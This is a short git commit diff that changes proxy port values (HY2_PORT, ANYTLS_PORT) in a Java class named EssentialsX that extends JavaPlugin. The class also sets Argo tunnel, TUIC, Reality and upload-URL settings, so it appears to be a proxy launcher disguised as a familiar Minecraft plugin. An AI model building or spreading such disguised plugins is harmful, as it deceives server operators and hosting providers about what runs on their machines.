a425f9079e91adfbdc9e2b74d2d3c606d38c2b94
timosid <timoside@proton.me>
2026-02-28 20:51:03 +0300

    Update HY2_PORT and ANYTLS_PORT values

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -82,9 +82,9 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "22268");
+        env.put("HY2_PORT", "25667");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "22267");
+        env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
